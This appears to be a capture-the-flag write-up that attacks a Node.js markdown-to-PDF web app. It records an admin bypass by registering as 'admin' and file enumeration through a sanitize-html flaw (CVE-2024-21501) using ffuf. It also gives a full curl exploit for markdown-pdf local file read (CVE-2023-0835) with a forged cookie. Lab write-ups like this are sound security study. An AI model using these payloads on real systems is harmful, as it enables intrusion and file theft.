# Dark Runes

## Primitives
### Have
- Arbitrary file read via outdated markdown-pdf library
    - This sits behind a pin which is written to a file. I'll need to either:
        - Overwrite the file with something I know
        - Break the crypto scheme to predict values
        - Read the file
        - Command execution
- Privilege escalation / authentication bypass via unregistered admin account / account takeover

### Want
- Privilege escalation
- Information leak
- Arbitrary file write 

## Dependency Analysis

```
"better-sqlite3": "^9.5.0",
"body-parser": "^1.20.2",
"cookie-parser": "^1.4.6",
"ejs": "^3.1.10",
"express": "^4.19.2",
"markdown-pdf": "11.0.0",
"node-html-markdown": "^1.3.0",
"sanitize-html": "^2.12.0"
```

- ejs potential - ssti
    - https://github.com/advisories/GHSA-j5pp-6f4w-r5r6
    - https://github.com/mde/ejs/issues/720
- markdown-pdf - file read / xss
    - https://fluidattacks.com/advisories/relsb/
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0835
- sanitize-html - information exposure
    - https://nvd.nist.gov/vuln/detail/cve-2024-21501
    - https://gist.github.com/Slonser/8b4d061abe6ee1b2e10c7242987674cf

k00lbeanz
password

### markdown-pdf
- Imported in `src/utils/exporter.js`
    - Used in subroutine `generatePDF`
    - This subroutine can be invoked from two HTTP URL endpoints
        - /document/export/:id
        - /document/debug/export
            - Both of these endpoints require administrative privileges
            - The /document/debug/export endpoint will require me to know the contents of the 'ACCESS_PASS' file.


## Entry Points
```
$ grep -Er "^router\.(get|post)"
src/routes/documents.js:router.post("/documents", isAuthenticated, (req, res) => {
src/routes/documents.js:router.get("/documents", isAuthenticated, (req, res) => {
src/routes/documents.js:router.post("/document/:id/delete", isAuthenticated, (req, res) => {
src/routes/documents.js:router.get("/documents/new", isAuthenticated, (req, res) => {
src/routes/documents.js:router.get("/document/:id", isAuthenticated, (req, res) => {

src/routes/generate.js:router.get("/document/export/:id",isAuthenticated,isAdmin,
src/routes/generate.js:router.post("/document/debug/export", isAuthenticated, isAdmin, async (req, res) => {

src/routes/auth.js:router.get("/login", (req, res) => {
src/routes/auth.js:router.get("/register", (req, res) => {
src/routes/auth.js:router.post('/login', (req, res) => {
src/routes/auth.js:router.post('/register', (req, res) => {
```

## Components
- Authenticator / Authorization checker
    - Session management w/ cookies
- Database
    - sqlite3
- File system handler
    - Read
    - Write
    - Used for 2fa ??
- Documents ??
    - Parser
    - Generator
        - Generates PDFs using `markdown-pdf` library
- Debug 

## Other Notes
- There are two middleware subroutines. Both are used to check AuthN/AuthZ
    - isAuthenticated
    - isAdmin

- Checking for sqli
```
$ grep -r "db\.prepare"    
src/database.js:const findUser = (username) => db.prepare('SELECT * FROM users WHERE username = ?').get(username);
src/database.js:                db.prepare('INSERT INTO users (username, password) VALUES (?, ?)').run(username, hash);
src/database.js:        const stmt = db.prepare('SELECT * FROM documents WHERE user_id = ?');
src/database.js:        const stmt = db.prepare('SELECT * FROM documents WHERE id = ? AND user_id = ?');
src/database.js:const deleteDocument = (id) => db.prepare('DELETE FROM documents WHERE id = ?').run(id);
src/database.js:        const stmt = db.prepare('INSERT INTO documents (user_id, content, integrity) VALUES (?, ?, ?)');
```

- Cookie signatures is not properly implemented. If an attacker knows the username and their id then they can create a cookie for that user
    - We would need to know the `SECRET` variable in order to perform this attack
- Re-review `generateAccessCode` in `src/utils/crypto.js`
- Re-review `generatePDF` in `src/utils/export.js`

- mfw the `isAdmin` middleware subroutine just checks if your username is admin. Only users you create are in the database so just create a user named 'admin'

- The secret access code generated by `generateAccessCode` is only 4 digits in length. This would be very easy to brute force.
    - How often does the `rotatePass` get invoked?
        - rotatePass gets invoked upon each incorrect pass check in the /document/debug/export URL. This means it will change after every guess and we only have a 1/10000 chance of getting it correct the first time.

- The `ACCESS_PASS` can only be 4 digits so 10**4 is 10,000 which is easier to brute-force
- We'll need to use CVE-2024-21501 to enumerate the files on the filesystem.

## Using CVE-2024-21501 to Enumerate Files on the Filesystem

- A PoC for CVE-2024-21501 is here https://gist.github.com/Slonser/8b4d061abe6ee1b2e10c7242987674cf


- Check if a file exists
```html
<!DOCTYPE html>
<html>
    <body>
        <a style='background-image: url("/*# sourceMappingURL=/etc/passwd */");'>@k00lbeanz</a>
    </body>
</html>
```
- You should be returned an HTML element which does not contain the `style` element.
    - `<a>@k00lbeanz</a>;`

- Check if a file doesn't exist
```html
<!DOCTYPE html>
<html>
    <body>
        <a style='background-image: url("/*# sourceMappingURL=./this/does/not/exist */")'>@k00lbeanz</a>;
    </body>
</html>
```
- You should see the sourceMappingURL in the result
    - `<a style="background-image:url(&quot;/*# sourceMappingURL=./this/does/not/exist */&quot;)">@k00lbeanz</a>;`

- Exploiting this will give us the ACCESS_PASS which will allow us to deliver CVE-2023-0835 to the target and get /flag.txt

```s
$ ffuf -w ./wordlist.txt -i -s -k -X $'POST' \
    -H $'Host: 94.237.63.90:35147' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 253' -H $'Origin: http://94.237.63.90:35147' -H $'Connection: keep-alive' -H $'Referer: http://94.237.63.90:35147/documents/new?' -H $'Upgrade-Insecure-Requests: 1' -H $'Priority: u=0, i' \
    -b $'user=eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9-745799fa7adf6236a805bcae40f8ec9fb3ab6d6589996cd5b4b37195cb50b097' \
    --data-binary $'content=%3C%21DOCTYPE+html%3E%0D%0A%3Chtml%3E%0D%0A++++%3Cbody%3E%0D%0A++++++++%3Ca+style%3D%27background-image%3A+url%28%22%2F*%23+sourceMappingURL%3D./FUZZ+*%2F%22%29%3B%27%3E%40k00lbeanz%3C%2Fa%3E%3B%0D%0A++++%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E' \
    -u $'http://94.237.63.90:35147/documents'
```


- Possible pin 0767
    - test with
        - `<a style='background-image: url("/*# sourceMappingURL=./7081 */");'>@k00lbeanz</a>`

- url encode the following payload
```js
<script>
 document.write(window.location);
 xhr = new XMLHttpRequest;
 xhr.onload=function(){document.write((this.responseText))};
 xhr.open("GET","file:///flag.txt");
 xhr.send();
</script>
```

- The following gets us the flag:
```s
curl -s -X POST "http://94.237.63.90:35147/document/debug/export" -H "Cookie: user=eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9-745799fa7adf6236a805bcae40f8ec9fb3ab6d6589996cd5b4b37195cb50b097" -d 'access_pass=0767&content=%3c%73%63%72%69%70%74%3e%0a%20%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e%29%3b%0a%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%3b%0a%20%78%68%72%2e%6f%6e%6c%6f%61%64%3d%66%75%6e%63%74%69%6f%6e%28%29%7b%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%28%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%29%29%7d%3b%0a%20%78%68%72%2e%6f%70%65%6e%28%22%47%45%54%22%2c%22%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%2e%74%78%74%22%29%3b%0a%20%78%68%72%2e%73%65%6e%64%28%29%3b%0a%3c%2f%73%63%72%69%70%74%3e' -o w00p.pdf
```